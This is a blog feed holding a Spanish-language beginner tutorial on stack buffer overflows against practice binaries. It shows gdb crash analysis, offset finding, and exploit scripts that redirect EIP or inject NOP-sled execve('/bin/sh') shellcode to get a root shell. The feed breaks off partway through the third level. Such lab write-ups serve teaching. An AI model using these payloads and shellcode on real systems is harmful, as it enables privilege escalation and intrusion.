<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T20:30:54-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
<img src="/assets/vulnhub/buff/icon.png" />
</p>

<h2 id="level-one">Level One</h2>

<blockquote>
  <p>Comparación de caracteres.</p>
</blockquote>

<blockquote>
  <p>Vamos a desactivar el ASRL temporalmente.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<ul>
  <li>
    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
  </li>
  <li>
    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/1.png" />
</p>

<ul>
  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
</ul>

<pre><code class="language-C">if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }
</code></pre>

<ul>
  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
B%
</code></pre></div></div>

<ul>
  <li>
    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
  </li>
  <li>
    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>

key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>

print<span class="o">(</span>first + key<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
  </li>
  <li>
    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
<span class="nv">$ </span><span class="nb">whoami
</span>miguel
</code></pre></div></div>

<h2 id="leveltwo">LevelTwo</h2>

<blockquote>
  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
</blockquote>

<ul>
  <li>
    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
  </li>
  <li>
    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/2.png" />
</p>

<ul>
  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/3.png" />
</p>

<ul>
  <li>
    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
  </li>
  <li>
    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/4.png" />
</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
Reading symbols from levelTwo...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
Set 1 arguments to program
</code></pre></div></div>

<ul>
  <li>Ahora lo corremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
EDX: 0x1
ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x61414145
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
1631666501 found at offset: 36
</code></pre></div></div>

<ul>
  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
All functions matching regular expression <span class="s2">"^spawn$"</span>:

Non-debugging symbols:
0x565561e9  spawn
</code></pre></div></div>

<ul>
  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
</code></pre></div></div>

<ul>
  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>

null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>

spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>

print<span class="o">(</span>null + spawn<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<h2 id="level-3">Level 3</h2>

<blockquote>
  <p>Stack Based.</p>
</blockquote>

<ul>
  <li>
    <p>Vamos a observar el código.</p>
  </li>
  <li>
    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main.png" />
</p>

<ul>
  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main2.png" />
</p>

<ul>
  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
</ul>

<pre><code class="language-C">void overflow(char *param_1)

{
  char local_10c [260];
  
  strcpy(local_10c,param_1);
  printf("Buf: %s\n",local_10c);
  return;
}
</code></pre>

<ul>
  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
Reading symbols from levelThree...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 300
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x132
EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
EDX: 0x1
ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41332541
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
1093870913 found at offset: 268
</code></pre></div></div>

<ul>
  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 268

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: j
      XRh//shh/bin��BBBB

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x116
EBX: 0xe3896e69
ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
EDX: 0x1
ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x80cdc931
ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
0004| 0xffffd244 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0008| 0xffffd248 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0012| 0xffffd24c <span class="o">(</span><span class="s2">"7bUV"</span><span class="o">)</span>
0016| 0xffffd250 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0020| 0xffffd254 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffd258 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffd25c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como pudimos ver <code class="language-plaintext highlighter-rouge">EIP</code> contiene <code class="language-plaintext highlighter-rouge">BBBB</code> que era lo que definimos que haga en el script.</p>
  </li>
  <li>
    <p>Vamos a buscar en la pila alguna dirección que contenga los <code class="language-plaintext highlighter-rouge">nops</code> que están antes del <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/pila.png" />
</p>

<ul>
  <li>El comando funciona para inspeccionar la memoria vamos a examinar 300 unidades <code class="language-plaintext highlighter-rouge">w</code> quiere decir que cada unidad que se examina es una palabra y <code class="language-plaintext highlighter-rouge">x</code> indica que el formato de salida debe ser <code class="language-plaintext highlighter-rouge">hexadecimal</code>.</li>
</ul>

<blockquote>
  <p>$esp es el registro del stack pointer en arquitecturas x86. Este registro apunta a la cima de la pila en la memoria. En el contexto de un programa que ejecuta un exploit de desbordamiento de buffer, $esp te dirá dónde está actualmente la “cima” de la pila, lo cual es crítico para entender cómo tus datos (o payload) están organizados en la memoria.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/300wx <span class="nv">$esp</span>
